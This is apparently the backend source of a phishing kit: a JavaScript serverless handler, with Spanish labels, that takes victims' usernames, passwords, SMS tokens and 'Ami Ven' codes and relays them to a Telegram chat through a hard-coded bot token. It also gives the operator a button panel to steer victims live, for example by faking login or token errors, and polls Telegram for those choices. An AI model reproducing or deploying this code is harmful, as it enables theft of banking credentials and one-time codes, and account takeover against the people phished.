export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  const BOT_TOKEN = process.env.BOT_TOKEN || '7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4';
  const CHAT_ID   = process.env.CHAT_ID   || '-1003027102929';

  let body;
  try {
    body = req.body;
  } catch {
    return res.status(400).json({ error: "JSON inválido" });
  }

  const { action, payload } = body;

  let text = "";
  let extra = {};

  const PANEL_BUTTONS = {
    inline_keyboard: [
      [
        { text: "➡️ Token SMS", callback_data: "ir_token_sms" },
        { text: "➡️ Ami Ven",   callback_data: "ir_ami_ven"   }
      ],
      [
        { text: "🔴 Error Token SMS", callback_data: "error_token" },
        { text: "🔴 Error Ami Ven",   callback_data: "error_ami"   }
      ],
      [
        { text: "🔴 Error Login", callback_data: "error_login" }
      ],
      [
        { text: "✅ Finalizar", callback_data: "finalizar" }
      ]
    ]
  };

  if (action === "login") {
    text  = `🔐 *NUEVO ACCESO*\n\n👤 Usuario: \`${payload.usuario}\`\n🔑 Clave: \`${payload.clave}\``;
    extra = { parse_mode: "Markdown" };
  } else if (action === "panel") {
    text  = `⚙️ *PANEL DE CONTROL*\n\n${payload.context || "Selecciona la acción:"}`;
    extra = { parse_mode: "Markdown", reply_markup: PANEL_BUTTONS };
  } else if (action === "token_sms") {
    text  = `📟 *TOKEN SMS INGRESADO*\n\n🔢 Código: \`${payload.codigo}\``;
    extra = { parse_mode: "Markdown" };
  } else if (action === "ami_ven") {
    text  = `📱 *CÓDIGO AMI VEN INGRESADO*\n\n🔢 Código: \`${payload.codigo}\``;
    extra = { parse_mode: "Markdown" };
  } else if (action === "poll") {
    const offset = payload.offset || 0;
    const tgUrl  = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?timeout=10&offset=${offset}&allowed_updates=["callback_query","message"]`;
    try {
      const tgRes  = await fetch(tgUrl);
      const tgData = await tgRes.json();
      return res.status(200).json(tgData);
    } catch (err) {
      return res.status(500).json({ error: "Error al conectar con Telegram" });
    }
  } else {
    return res.status(400).json({ error: "Acción desconocida" });
  }

  const tgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  try {
    const tgRes = await fetch(tgUrl, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ chat_id: CHAT_ID, text, ...extra })
    });
    const tgData = await tgRes.json();
    return res.status(200).json(tgData);
  } catch (err) {
    return res.status(500).json({ error: "Error al enviar a Telegram" });
  }
}
